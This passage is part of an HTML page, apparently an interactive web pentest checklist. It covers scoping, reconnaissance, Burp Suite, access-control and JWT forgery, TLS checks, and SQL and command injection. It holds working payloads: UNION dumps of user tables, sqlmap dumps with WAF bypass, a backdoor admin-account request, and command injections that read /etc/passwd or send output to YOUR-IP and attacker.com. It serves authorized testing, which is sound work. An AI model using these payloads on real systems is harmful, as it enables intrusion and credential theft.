@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>⚡ WebApp Pentest Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;1,9..40,300&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#05080f;--surf:#0b1220;--card:#101825;--cardh:#151f2e;--bdr:#1c2b40;--bdrl:#253548;--txt:#c4d4e8;--txtm:#4e6580;--txtb:#eaf2ff;--acc:#00d4ff;--accg:rgba(0,212,255,.1);--grn:#0dd88a;--grng:rgba(13,216,138,.1);--red:#ff4a6e;--org:#ff8c42;--yel:#f5c842;--pur:#b48bfa;--mono:'JetBrains Mono',monospace;--head:'Syne',sans-serif;--body:'DM Sans',sans-serif;--sw:272px;--hh:60px;--r:7px}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:var(--bg);color:var(--txt);font-size:14px;line-height:1.6;overflow-x:hidden}
+/* HEADER */
+.hdr{position:fixed;top:0;left:0;right:0;height:var(--hh);background:rgba(5,8,15,.96);backdrop-filter:blur(16px);border-bottom:1px solid var(--bdr);display:flex;align-items:center;padding:0 20px;z-index:100;gap:16px}
+.hdr-logo{font-family:var(--head);font-size:16px;font-weight:800;color:var(--txtb);display:flex;align-items:center;gap:9px;flex-shrink:0;letter-spacing:-.02em}
+.hdr-logo-ic{width:30px;height:30px;background:linear-gradient(135deg,var(--acc),var(--pur));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px}
+.hdr-logo em{font-style:normal;color:var(--acc)}
+.hdr-pw{flex:1;display:flex;align-items:center;gap:10px;min-width:0}
+.hdr-pl{font-family:var(--mono);font-size:10px;color:var(--txtm);flex-shrink:0}
+.hdr-pb{flex:1;height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;max-width:360px}
+.hdr-pf{height:100%;background:linear-gradient(90deg,var(--acc),var(--grn));border-radius:2px;transition:width .5s ease;width:0%}
+.hdr-pp{font-family:var(--mono);font-size:11px;font-weight:500;color:var(--acc);min-width:34px}
+.hdr-acts{display:flex;gap:7px;margin-left:auto;flex-shrink:0}
+.btn{font-family:var(--mono);font-size:10px;font-weight:500;padding:5px 11px;border-radius:5px;border:1px solid var(--bdrl);background:var(--card);color:var(--txtm);cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:5px;white-space:nowrap}
+.btn:hover{border-color:var(--acc);color:var(--acc);background:var(--accg)}
+.btn-d:hover{border-color:var(--red);color:var(--red);background:rgba(255,74,110,.08)}
+.sw{position:relative;display:flex;align-items:center}
+.si{font-family:var(--mono);font-size:11px;background:var(--card);border:1px solid var(--bdrl);border-radius:var(--r);color:var(--txt);padding:5px 11px 5px 28px;width:180px;outline:none;transition:all .2s}
+.si::placeholder{color:var(--txtm)}
+.si:focus{border-color:var(--acc);background:var(--accg);width:220px}
+.si-ic{position:absolute;left:9px;color:var(--txtm);font-size:12px;pointer-events:none}
+/* SIDEBAR */
+.sb{position:fixed;top:var(--hh);left:0;bottom:0;width:var(--sw);background:var(--surf);border-right:1px solid var(--bdr);overflow-y:auto;z-index:90;padding:12px 0 40px}
+.sb::-webkit-scrollbar{width:3px}.sb::-webkit-scrollbar-thumb{background:var(--bdrl);border-radius:2px}
+.sbl{font-family:var(--mono);font-size:8px;letter-spacing:.18em;color:var(--txtm);padding:12px 18px 4px;text-transform:uppercase}
+.sbi{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:5px;cursor:pointer;transition:all .15s;color:var(--txtm);font-size:11.5px;margin:1px 6px;text-decoration:none}
+.sbi:hover{background:var(--card);color:var(--txt)}
+.sbi.active{background:var(--accg);color:var(--acc);border:1px solid rgba(0,212,255,.18)}
+.sbi-ic{font-size:13px;flex-shrink:0;width:16px;text-align:center}
+.sbi-tx{flex:1;line-height:1.3}
+.sbi-pc{font-family:var(--mono);font-size:9px;color:var(--txtm);flex-shrink:0}
+.sbbar{height:2px;background:var(--bdr);border-radius:1px;margin:2px 10px 4px;overflow:hidden}
+.sbbf{height:100%;background:var(--grn);border-radius:1px;transition:width .4s ease;width:0%}
+.sbdv{height:1px;background:var(--bdr);margin:6px 14px}
+/* MAIN */
+.main{margin-left:var(--sw);margin-top:var(--hh);min-height:calc(100vh - var(--hh));padding:36px 44px 80px;max-width:1060px}
+/* SECTION */
+.sec{margin-bottom:56px;scroll-margin-top:calc(var(--hh) + 16px)}
+.sechdr{display:flex;align-items:flex-start;gap:14px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px solid var(--bdr)}
+.secicw{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;background:var(--card);border:1px solid var(--bdr)}
+.sectw{flex:1;min-width:0}
+.sectag{font-family:var(--mono);font-size:9px;letter-spacing:.15em;color:var(--txtm);text-transform:uppercase;margin-bottom:3px}
+.sectit{font-family:var(--head);font-size:22px;font-weight:700;color:var(--txtb);line-height:1.2;margin-bottom:7px}
+.secmt{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+.bdg{font-family:var(--mono);font-size:9px;font-weight:500;padding:2px 7px;border-radius:4px;letter-spacing:.04em}
+.b-ow{background:rgba(180,139,250,.12);color:var(--pur);border:1px solid rgba(180,139,250,.22)}
+.b-cr{background:rgba(255,74,110,.12);color:var(--red);border:1px solid rgba(255,74,110,.22)}
+.b-hi{background:rgba(255,140,66,.12);color:var(--org);border:1px solid rgba(255,140,66,.22)}
+.b-me{background:rgba(245,200,66,.12);color:var(--yel);border:1px solid rgba(245,200,66,.22)}
+.b-in{background:var(--accg);color:var(--acc);border:1px solid rgba(0,212,255,.2)}
+.b-ni{background:var(--grng);color:var(--grn);border:1px solid rgba(13,216,138,.2)}
+.secpr{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.secpct{font-family:var(--mono);font-size:11px;color:var(--txtm);min-width:30px;text-align:right}
+.secmb{width:72px;height:3px;background:var(--bdr);border-radius:2px;overflow:hidden}
+.secmf{height:100%;background:var(--grn);border-radius:2px;transition:width .4s ease;width:0%}
+.secdone{display:none;font-family:var(--mono);font-size:10px;color:var(--grn);background:var(--grng);border:1px solid rgba(13,216,138,.25);border-radius:4px;padding:2px 8px;align-items:center;gap:5px}
+.sec.alldone .secdone{display:flex}
+.sec.alldone .secicw{background:var(--grng);border-color:rgba(13,216,138,.25)}
+/* SUBSECTION */
+.sub{margin-bottom:20px;background:var(--card);border:1px solid var(--bdr);border-radius:9px;overflow:hidden;transition:border-color .2s}
+.sub:hover{border-color:var(--bdrl)}
+.subhdr{display:flex;align-items:center;padding:12px 16px;cursor:pointer;transition:background .15s;user-select:none;gap:10px}
+.subhdr:hover{background:var(--cardh)}
+.sub.open .subhdr{border-bottom:1px solid var(--bdr)}
+.subtit{font-family:var(--head);font-size:13.5px;font-weight:600;color:var(--txtb);flex:1}
+.subpr{display:flex;align-items:center;gap:7px;margin-right:8px}
+.subcnt{font-family:var(--mono);font-size:10px;color:var(--txtm)}
+.submb{width:52px;height:2px;background:var(--bdr);border-radius:1px;overflow:hidden}
+.submf{height:100%;background:var(--grn);border-radius:1px;transition:width .3s ease;width:0%}
+.chev{color:var(--txtm);font-size:11px;transition:transform .2s;flex-shrink:0}
+.sub.open .chev{transform:rotate(180deg)}
+.subbody{display:none;padding:14px 16px 16px}
+.sub.open .subbody{display:block}
+/* STEPS */
+.steps{list-style:none;display:flex;flex-direction:column;gap:5px;margin-bottom:14px}
+.step{display:flex;align-items:flex-start;gap:10px;padding:9px 12px;border-radius:6px;background:rgba(255,255,255,.018);border:1px solid transparent;transition:all .15s;cursor:pointer}
+.step:hover{background:rgba(0,212,255,.04);border-color:rgba(0,212,255,.12)}
+.step.done{background:rgba(13,216,138,.05);border-color:rgba(13,216,138,.14)}
+.stepbox{width:17px;height:17px;border:1.5px solid var(--bdrl);border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all .18s;margin-top:2px}
+.step.done .stepbox{background:var(--grn);border-color:var(--grn)}
+.stepbox::after{content:'';width:4px;height:8px;border-right:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(45deg) translate(-1px,-1px);opacity:0;transition:opacity .15s}
+.step.done .stepbox::after{opacity:1}
+.stepnum{font-family:var(--mono);font-size:10px;color:var(--acc);flex-shrink:0;margin-top:2px;min-width:18px}
+.steptxt{font-size:13px;color:var(--txt);line-height:1.5;transition:color .2s}
+.step.done .steptxt{color:var(--txtm);text-decoration:line-through;text-decoration-color:rgba(13,216,138,.4);text-decoration-thickness:1px}
+/* CODE BLOCKS */
+.cb{margin:10px 0;border-radius:8px;overflow:hidden;border:1px solid var(--bdr);background:#020509}
+.cbhdr{display:flex;align-items:center;padding:7px 13px;background:rgba(255,255,255,.025);border-bottom:1px solid var(--bdr);gap:8px}
+.cbdots{display:flex;gap:4px}
+.cdd{width:8px;height:8px;border-radius:50%}
+.dr{background:#ff5f57}.dy{background:#febc2e}.dg{background:#28c840}
+.cblang{font-family:var(--mono);font-size:9px;color:var(--acc);letter-spacing:.12em;text-transform:uppercase;flex:1;padding-left:6px}
+.cpbtn{font-family:var(--mono);font-size:10px;color:var(--txtm);background:none;border:1px solid var(--bdrl);border-radius:4px;padding:2px 8px;cursor:pointer;transition:all .2s}
+.cpbtn:hover{color:var(--acc);border-color:var(--acc)}
+.cpbtn.ok{color:var(--grn);border-color:var(--grn)}
+.cbpre{padding:14px 16px;overflow-x:auto}
+.cbpre pre{font-family:var(--mono);font-size:11.5px;line-height:1.75;color:#c8d8f0;white-space:pre}
+/* INFO/WARN */
+.ib{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.18);border-radius:7px;padding:10px 14px;margin:10px 0;display:flex;gap:10px;align-items:flex-start}
+.ib-ic{font-size:14px;flex-shrink:0;margin-top:1px}
+.ib-tx{font-size:12.5px;color:var(--txt);line-height:1.5}
+.wb{background:rgba(255,140,66,.05);border-color:rgba(255,140,66,.22)}
+/* TABLE */
+.dt{width:100%;border-collapse:collapse;margin:10px 0;font-size:12px}
+.dt th{font-family:var(--mono);font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:var(--acc);padding:7px 11px;text-align:left;border-bottom:1px solid var(--bdrl)}
+.dt td{padding:7px 11px;border-bottom:1px solid var(--bdr);color:var(--txt);vertical-align:top}
+.dt tr:last-child td{border-bottom:none}
+.dt tr:hover td{background:rgba(255,255,255,.018)}
+.dt code{font-family:var(--mono);font-size:10.5px;background:rgba(255,255,255,.06);padding:1px 5px;border-radius:3px;color:var(--acc)}
+/* PAYLOADS */
+.plist{display:flex;flex-wrap:wrap;gap:5px;margin:8px 0}
+.ptag{font-family:var(--mono);font-size:10.5px;background:rgba(0,0,0,.35);border:1px solid var(--bdrl);border-radius:4px;padding:3px 8px;color:#6adb9a;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:5px;user-select:none}
+.ptag:hover{border-color:#6adb9a;background:rgba(106,219,154,.08)}
+.ptag::before{content:'⎘';font-size:9px;opacity:.7}
+/* NOTES */
+.notesw{margin-top:14px;padding-top:12px;border-top:1px solid var(--bdr)}
+.noteslbl{font-family:var(--mono);font-size:9px;letter-spacing:.12em;color:var(--txtm);text-transform:uppercase;margin-bottom:5px}
+.notesta{width:100%;min-height:64px;background:rgba(0,0,0,.28);border:1px solid var(--bdr);border-radius:6px;color:var(--txt);font-family:var(--mono);font-size:11.5px;padding:9px 11px;resize:vertical;outline:none;transition:border-color .2s;line-height:1.5}
+.notesta:focus{border-color:var(--acc)}
+.notesta::placeholder{color:var(--txtm)}
+/* MISC */
+.nores{text-align:center;padding:60px 20px;color:var(--txtm);font-family:var(--mono);font-size:13px;display:none}
+.toast{position:fixed;bottom:20px;right:20px;background:var(--card);border:1px solid var(--bdrl);border-radius:8px;padding:10px 14px;font-family:var(--mono);font-size:11px;color:var(--txt);display:flex;align-items:center;gap:8px;z-index:999;transform:translateY(70px);opacity:0;transition:all .3s ease;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+.toast.show{transform:translateY(0);opacity:1}
+::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--bdrl);border-radius:3px}
+@media(max-width:860px){.sb{display:none}.main{margin-left:0;padding:20px 16px 60px}}
+</style>
+</head>
+<body>
+
+<header class="hdr">
+  <div class="hdr-logo"><div class="hdr-logo-ic">⚡</div>Web<em>Pentest</em></div>
+  <div class="hdr-pw">
+    <span class="hdr-pl">OVERALL</span>
+    <div class="hdr-pb"><div class="hdr-pf" id="gFill"></div></div>
+    <span class="hdr-pp" id="gPct">0%</span>
+  </div>
+  <div class="hdr-acts">
+    <div class="sw"><span class="si-ic">🔍</span><input class="si" id="srch" type="text" placeholder="Search steps..."></div>
+    <button class="btn" onclick="exportProg()">⬇ Export</button>
+    <button class="btn btn-d" onclick="doReset()">↺ Reset</button>
+  </div>
+</header>
+
+<nav class="sb" id="sidebar"></nav>
+<main class="main" id="main"><div style="padding:60px;text-align:center;font-family:var(--mono);color:var(--txtm)">Loading guide...</div></main>
+<div class="toast" id="toast"></div>
+
+<!-- ═══════════════════════════════════════════════════════
+     GUIDE DATA — JSON island. </script not present here.
+     The JSON encoder has replaced </ with <\/ throughout.
+     ═══════════════════════════════════════════════════════ -->
+<script type="application/json" id="gd">[{"id":"s01","icon":"📋","title":"Pre-Engagement & Scoping","tag":"FOUNDATION","badges":[],"subs":[{"id":"s01a","title":"1.1 Define Scope & Authorization","steps":["Obtain signed Rules of Engagement (RoE) document before any testing","Identify all in-scope IP ranges, domains, and specific endpoints","Identify and document out-of-scope systems (payment processors, CDNs, third-parties)","Confirm testing window and any blackout/maintenance periods","Establish emergency contact list for accidental outages or incidents","Confirm whether testing is Black Box, Grey Box, or White Box"],"codes":[],"infos":[{"type":"warn","text":"Never begin testing without written, signed authorization. Verbal confirmation is not sufficient."}]},{"id":"s01b","title":"1.2 Pre-Test Checklist","steps":["Written authorization received and on file","Scope document signed by authorized stakeholder","VPN or IP whitelist configured if required by target","Testing environment confirmed — production vs staging","Burp Suite Professional installed and licensed","Note-taking tool configured (Obsidian, CherryTree, Notion)","Screenshot/recording tool ready (Flameshot, ShareX)","Separate browser profile created for testing (Firefox + FoxyProxy)","Wordlists downloaded: SecLists, rockyou.txt","All tools verified working: nmap, sqlmap, ffuf, nikto"],"codes":[],"infos":[]},{"id":"s01c","title":"1.3 Testing Types Reference","steps":[],"codes":[],"table":{"cols":["Type","Access Level","Simulates","Best For"],"rows":[["Black Box","No prior knowledge","External attacker","Real-world external threat scenario"],["Grey Box","Low-priv credentials + partial docs","Insider / authenticated attacker","Most realistic; most common engagement type"],["White Box","Full access: source code, architecture","Code auditor","Finding all vulns; compliance audits"]]},"infos":[]}]},{"id":"s02","icon":"🔭","title":"Reconnaissance & Information Gathering","tag":"RECON","badges":[{"t":"Passive + Active","c":"b-in"},{"t":"WSTG-INFO","c":"b-ni"}],"subs":[{"id":"s02a","title":"2.1 Passive Reconnaissance (OSINT)","steps":["Run WHOIS lookup — note registrant email, nameservers, registration dates","Enumerate DNS records (A, MX, TXT, CNAME, NS)","Attempt DNS zone transfer (axfr) — rarely succeeds but always try","Query Certificate Transparency logs via crt.sh for subdomain discovery","Run subdomain enumeration with subfinder/amass","Perform targeted Google dorking (see payloads below)","Search Shodan/Censys for target IP ranges and exposed services","Mine Wayback Machine for historical URLs and forgotten endpoints","Search GitHub/GitLab for leaked credentials, API keys, config files","Check LinkedIn for employee names and tech stack hints"],"codes":[{"lang":"bash","code":"# WHOIS\nwhois target.com\n\n# DNS enumeration\ndig target.com ANY\ndig axfr target.com @ns1.target.com\n\n# Subdomain enumeration\nsubfinder -d target.com -o subdomains.txt\namass enum -d target.com -o amass.txt\n\n# Certificate transparency\ncurl \"https://crt.sh/?q=%25.target.com&output=json\" | jq '.[].name_value' | sort -u\n\n# Wayback URLs\nwaybackurls target.com | tee wayback.txt\ncat wayback.txt | grep -E \"\\.(php|asp|jsp|json|xml|bak|old|log|env|sql)\""},{"lang":"text","code":"# Google Dorks\nsite:target.com filetype:pdf OR filetype:xls OR filetype:doc\nsite:target.com inurl:admin OR inurl:login OR inurl:dashboard\nsite:target.com \"index of\" OR \"directory listing\"\nsite:target.com filetype:env OR filetype:sql OR filetype:bak\nsite:target.com inurl:api OR inurl:swagger OR inurl:graphql\n\"@target.com\" site:linkedin.com\nsite:github.com \"target.com\" password OR apikey OR secret"}],"infos":[]},{"id":"s02b","title":"2.2 Active Reconnaissance","steps":["Run full port scan with service/version detection","Run web server fingerprinting with whatweb/httpx","Brute-force directories and files with ffuf or gobuster","Identify application technology stack (Wappalyzer, response headers)","Check HTTP response headers for software version disclosure","Browse app manually while proxying through Burp to build site map","Check /robots.txt and /sitemap.xml for hidden paths","Look for API documentation endpoints (/swagger.json, /openapi.json, /api-docs)"],"codes":[{"lang":"bash","code":"# Port scanning\nnmap -sV -sC -T4 -p- target.com -oA nmap_full\nnmap -sU --top-ports 200 target.com\n\n# Web fingerprinting\nwhatweb target.com\nhttpx -l subdomains.txt -title -tech-detect -status-code\n\n# Directory enumeration\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \\\n     -u https://target.com/FUZZ -mc 200,301,302,403 -o ffuf.json\n\ngobuster dir -u https://target.com \\\n             -w /usr/share/wordlists/dirb/common.txt \\\n             -x php,asp,aspx,jsp,html,txt,bak,old,conf -t 50\n\n# Recursive fuzzing\nferoxbuster -u https://target.com --depth 3 -t 100 -x php,txt,html"}],"infos":[]}]},{"id":"s03","icon":"🔧","title":"Burp Suite Setup & Core Workflow","tag":"TOOLING","badges":[{"t":"Burp Suite Pro","c":"b-in"}],"subs":[{"id":"s03a","title":"3.1 Initial Burp Configuration","steps":["Open Burp → Proxy tab → confirm listener on 127.0.0.1:8080","Install FoxyProxy extension in Firefox for easy proxy toggling","Navigate to http://burp in proxied browser → download CA Certificate","Import CA cert into Firefox: Settings → Privacy → Certificates → Authorities → Import","Check \"Trust this CA to identify websites\"","In Burp Target tab → add target domain to scope","Enable \"Intercept only in-scope requests\" in Proxy settings","Configure Burp Dashboard → New Scan to crawl the app"],"codes":[],"infos":[{"type":"info","text":"Always set scope before intercepting to avoid capturing CDN/analytics traffic. Use \"Advanced Scope Control\" for wildcard matching."}]},{"id":"s03b","title":"3.2 Core Burp Tool Workflow","steps":["Proxy → intercept request → Ctrl+R to Send to Repeater","Repeater → modify parameters → click Send → analyze response","Use Ctrl+Z in Repeater to undo changes and compare responses","Proxy → intercept request → Ctrl+I to Send to Intruder","Intruder → clear default markers → select injection point → Add §§","Intruder → Payloads → load wordlist → Start Attack","Comparer → paste two responses → Compare (Word/Byte) to spot differences","Decoder → paste value → Decode as Base64/URL/HTML to inspect","Sequencer → capture token → Start live capture → Analyze entropy"],"codes":[],"table":{"cols":["Tool","Shortcut","Primary Use"],"rows":[["Repeater","Ctrl+R","Manually replay & modify single requests"],["Intruder","Ctrl+I","Automated fuzzing with payload lists"],["Scanner","(Pro)","Automated vuln detection + crawling"],["Decoder","Ctrl+Shift+D","Encode/decode Base64, URL, HTML, Hex"],["Comparer","Ctrl+Shift+C","Diff two requests or responses"],["Sequencer","","Token entropy analysis"],["Collaborator","","Out-of-band detection (SSRF, blind XXE, etc.)"],["Logger","","Full history of all proxied traffic"]]},"infos":[]}]},{"id":"s04","icon":"🔓","title":"A01 – Broken Access Control","tag":"OWASP A01:2021","badges":[{"t":"A01:2021","c":"b-ow"},{"t":"CRITICAL","c":"b-cr"},{"t":"NIST AC-3","c":"b-ni"}],"subs":[{"id":"s04a","title":"4.1 Horizontal Privilege Escalation (IDOR)","steps":["Authenticate as User A and browse the application normally","In Burp Proxy History, identify requests with user-specific object IDs (user IDs, order IDs, document IDs)","Send the identified request to Repeater (Ctrl+R)","Change the ID value to another user's ID and click Send","Check if another user's data is returned — if yes, IDOR confirmed","Test with: sequential IDs ±1, ID=1, ID=0, ID=-1, large numbers","Send to Intruder → mark ID parameter → Numbers payload 1→500 → look for length anomalies"],"codes":[{"lang":"http","code":"# Original request\nGET /api/users/1042/profile HTTP/1.1\nHost: target.com\nCookie: session=USER_A_TOKEN\n\n# Modified — change ID to another user's\nGET /api/users/1041/profile HTTP/1.1\nHost: target.com\nCookie: session=USER_A_TOKEN\n\n# Also test:\nGET /invoices?id=55820 HTTP/1.1\nGET /download?file=report_1041.pdf HTTP/1.1"},{"lang":"text","code":"Test ID values:\n1041, 1043          → adjacent IDs\n1                   → first user (often admin)\n0, -1               → edge cases\n1042.1              → float injection\n999999, 0x1042      → large / hex values\n../admin/config     → path traversal\nnull, undefined     → null-type injection"}],"infos":[{"type":"info","text":"Sort Intruder results by Response Length. Responses that differ in length from the baseline likely indicate access to other users' data."}]},{"id":"s04b","title":"4.2 Vertical Privilege Escalation (User → Admin)","steps":["Map all admin/privileged endpoints via directory brute-force and JS analysis","As a low-privilege user, attempt to access admin endpoints directly in Repeater","Look for role or is_admin parameters in POST/PUT request bodies","Try changing \"role\":\"user\" to \"role\":\"admin\" in profile update requests","Test calling admin API functions with a user-level JWT or session token","Try adding admin parameters to GET requests: ?admin=true, ?role=admin"],"codes":[{"lang":"http","code":"# Forced browsing to admin endpoint as low-priv user\nGET /admin/users HTTP/1.1\nHost: target.com\nCookie: session=LOW_PRIV_TOKEN\n\n# Role manipulation in body\nPOST /api/update-profile HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"alice\",\"role\":\"admin\",\"email\":\"alice@example.com\"}\n\n# Admin API call with user token\nPOST /api/admin/create-user HTTP/1.1\nAuthorization: Bearer LOW_PRIV_JWT\n\n{\"username\":\"backdoor\",\"role\":\"admin\",\"password\":\"Test1234!\"}"},{"lang":"text","code":"# Admin paths to probe\n/admin\n/admin/users\n/admin/dashboard\n/api/admin/\n/manage\n/internal\n/superuser\n/control\n/panel"}],"infos":[]},{"id":"s04c","title":"4.3 JWT Token Manipulation","steps":["Capture JWT from Authorization header or cookie in Burp","In Burp Decoder, paste and Base64-decode each section (header.payload.signature)","Install JWT Editor extension from BApp Store","Test \"alg: none\" attack — remove signature requirement","Modify payload: change role/sub/user_id to privileged values","Test RS256→HS256 algorithm confusion if public key is obtainable","Use JWT Editor \"Embedded JWK\" attack","Check for JWT in localStorage via browser DevTools → Application"],"codes":[{"lang":"text","code":"# alg:none attack — forge without signature\n# Step 1: Create modified header\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n→ Base64url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0\n\n# Step 2: Modify payload (change role to admin)\n{\"sub\":\"1042\",\"role\":\"admin\",\"iat\":1700000000}\n→ Base64url encode this\n\n# Step 3: Combine with empty signature (trailing dot)\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.MODIFIED_PAYLOAD.\n\n# In Repeater, replace Authorization header value with this token"}],"infos":[{"type":"info","text":"Use Burp's JWT Editor BApp for automated attacks: None Algorithm, Embedded JWK injection, and Key Confusion in one click."}]}]},{"id":"s05","icon":"🔐","title":"A02 – Cryptographic Failures","tag":"OWASP A02:2021","badges":[{"t":"A02:2021","c":"b-ow"},{"t":"HIGH","c":"b-hi"},{"t":"NIST SC-8","c":"b-ni"}],"subs":[{"id":"s05a","title":"5.1 TLS/SSL Configuration Testing","steps":["Run testssl.sh against all HTTPS endpoints","Check for support of deprecated TLS 1.0 / TLS 1.1","Check for SSL 2.0 / 3.0 support (critical if found)","Verify no weak cipher suites (RC4, DES, 3DES, NULL, EXPORT)","Check certificate validity — not expired, correct hostname, trusted CA","Test HTTP→HTTPS redirect on port 80","Verify HSTS header is present with adequate max-age","Check for POODLE, BEAST, CRIME, HEARTBLEED vulnerabilities"],"codes":[{"lang":"bash","code":"# Comprehensive TLS test\ntestssl.sh https://target.com\n\n# nmap SSL scripts\nnmap --script ssl-enum-ciphers -p 443 target.com\nnmap --script ssl-heartbleed -p 443 target.com\n\n# Quick curl check for HSTS + redirect\ncurl -sI http://target.com | grep -i \"location\\|strict-transport\"\ncurl -sI https://target.com | grep -i \"strict-transport\""}],"table":{"cols":["Header / Feature","Secure Value","Finding if Missing"],"rows":[["HSTS","max-age=31536000; includeSubDomains","SSL stripping possible"],["TLS Version","TLS 1.2 minimum, TLS 1.3 preferred","Downgrade attacks"],["Certificate","Valid, not expired, correct CN/SAN","MitM possible"],["HTTP Redirect","301 to HTTPS","Cleartext credential exposure"]]},"infos":[]},{"id":"s05b","title":"5.2 Sensitive Data in Transit and Storage","steps":["In Burp History, search for passwords transmitted in GET parameters","Check all Set-Cookie headers for missing Secure and HttpOnly flags","Search Burp responses for credit card patterns (16 digits), SSNs, API keys","Download and grep JavaScript files for hardcoded secrets","Test if password reset returns original password (means plaintext storage)","Check if same password always generates same hash (means no salt)","Inspect localStorage and sessionStorage via DevTools for sensitive data","Check if sensitive data appears in browser URL bar or page title (logged in proxies)"],"codes":[{"lang":"bash","code":"# Burp search regex for sensitive data (use in Logger → Search)\n(?i)(password|passwd|secret|api_key|token|ssn|credit.?card|bearer|private_key)\n\n# AWS key pattern\nAKIA[0-9A-Z]{16}\n\n# Grep downloaded JS files\nfind . -name \"*.js\" | xargs grep -l -E \"(api_key|apikey|secret|password|token|aws)\"\n\n# Check cookies in Burp response\n# Look for missing flags in Set-Cookie:\nSet-Cookie: session=abc123   ← MISSING HttpOnly; Secure; SameSite"}],"infos":[{"type":"warn","text":"Passwords in GET parameters are logged in server access logs, browser history, proxy logs, and Referer headers — always a HIGH or CRITICAL finding."}]}]},{"id":"s06","icon":"💉","title":"A03 – Injection (SQL, Command, LDAP)","tag":"OWASP A03:2021","badges":[{"t":"A03:2021","c":"b-ow"},{"t":"CRITICAL","c":"b-cr"},{"t":"NIST SI-10","c":"b-ni"}],"subs":[{"id":"s06a","title":"6.1 SQL Injection — Detection","steps":["Identify all user-controlled inputs that may reach a database (params, headers, body)","In Burp Repeater, inject a single quote ' into each parameter","Check response for SQL error messages or behavior changes","Test boolean payloads: AND 1=1-- (true) vs AND 1=2-- (false)","Compare response lengths — different = injection point","Test time-based: inject SLEEP(5) and measure response time","Test all input locations: URL params, POST body, Cookie values, User-Agent, Referer, X-Forwarded-For"],"codes":[{"lang":"http","code":"# Single quote detection\nGET /products?id=42' HTTP/1.1\n→ Look for: SQL syntax error, 500 error, empty response\n\n# Boolean-based blind\nGET /products?id=42 AND 1=1-- HTTP/1.1   ← normal response\nGET /products?id=42 AND 1=2-- HTTP/1.1   ← different response = SQLI\n\n# Time-based blind (MySQL)\nGET /products?id=42 AND SLEEP(5)-- HTTP/1.1\n# PostgreSQL: ; SELECT pg_sleep(5)--\n# MSSQL:      ; WAITFOR DELAY '0:0:5'--\n# Oracle:     AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=1--"},{"lang":"text","code":"# Quick detection payloads (try in each parameter)\n'\n''\n`\n\")\n'))\n' OR '1'='1\n' OR 1=1--\n'; --\n1 AND 1=1\n1 AND 1=2\n1' AND '1'='1\nadmin'--\n' UNION SELECT NULL--"}],"infos":[]},{"id":"s06b","title":"6.2 SQL Injection — Extraction","steps":["Determine number of columns using ORDER BY clause incrementing until error","Use UNION SELECT with NULLs to confirm column count","Find which columns are reflected in the response (text-type columns)","Extract database name, version, and user","Enumerate tables from information_schema.tables","Dump target table data (users, credentials)"],"codes":[{"lang":"sql","code":"-- Step 1: Find column count\nGET /products?id=42 ORDER BY 1--   ← no error\nGET /products?id=42 ORDER BY 2--   ← no error\nGET /products?id=42 ORDER BY 4--   ← ERROR → 3 columns\n\n-- Step 2: UNION to find reflected columns (use -1 to suppress real row)\nGET /products?id=-1 UNION SELECT NULL,NULL,NULL--\nGET /products?id=-1 UNION SELECT 'a','b','c'--   ← which appear in response?\n\n-- Step 3: Extract DB info (MySQL)\nid=-1 UNION SELECT version(),database(),user()--\n\n-- Step 4: List tables\nid=-1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--\n\n-- Step 5: Dump users table\nid=-1 UNION SELECT username,password,email FROM users--"},{"lang":"bash","code":"# Automate with sqlmap (save request from Burp: right-click → Save item)\nsqlmap -r request.txt --dbs --batch\nsqlmap -r request.txt -D target_db --tables --batch\nsqlmap -r request.txt -D target_db -T users --dump --batch\n\n# With WAF bypass\nsqlmap -r request.txt --dbs --tamper=space2comment,between --random-agent"}],"infos":[{"type":"info","text":"In Burp Intruder, use the \"SQL Injection\" payload set under Fuzzing to automate detection across multiple parameters simultaneously."}]},{"id":"s06c","title":"6.3 Command Injection","steps":["Identify inputs that likely invoke OS commands (ping tools, DNS lookup, file conversion)","Inject command separator characters after legitimate input","Test time-based blind: inject sleep 5 and measure response time","For blind injection, set up Burp Collaborator and inject DNS callback payloads","Test all separator variants: ; && || | ` $()"],"codes":[{"lang":"http","code":"# In Burp Repeater — test each separator\nPOST /tools/ping HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nhost=google.com%3Bwhoami\nhost=google.com%26%26id\nhost=google.com%7Cwhoami\nhost=google.com%60id%60\nhost=google.com%3Bsleep%205\n\n# Out-of-band (Collaborator)\nhost=google.com%3Bnslookup+$(whoami).COLLABORATOR-DOMAIN\nhost=google.com%3Bcurl+http%3A%2F%2FYOUR-IP%3A9001%2F$(id|base64)"},{"lang":"text","code":"# Command injection payload variants\n; whoami\n&& whoami\n| whoami\n|| whoami\n`whoami`\n$(whoami)\n; id; hostname; cat /etc/passwd\n; sleep 5          ← time-based blind\n; ping -c 5 attacker.com   ← OOB 